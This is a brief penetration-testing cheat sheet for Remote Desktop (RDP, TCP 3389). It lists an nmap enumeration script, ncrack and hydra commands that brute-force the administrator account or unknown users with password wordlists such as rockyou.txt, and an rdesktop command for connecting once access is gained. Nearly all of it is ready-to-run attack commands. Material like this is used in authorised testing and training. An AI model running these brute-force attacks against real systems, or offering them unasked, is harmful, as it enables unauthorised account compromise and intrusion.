# RDP -TCP 3389

## Nmap scripts

```
nmap -p 3389 --script rdp-ntlm-info $ip
```

## Brute-force

**Ncrack**

```
ncrack -vv --user administrator -P password-file.txt rdp://$ip
```

**Hydra**

**Known user**

```
hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

**Unknown user**

```
hydra -V -f -L user.txt -P dict.txt rdp://192.168.0.102
```

## Connection

```
rdesktop $ip
```
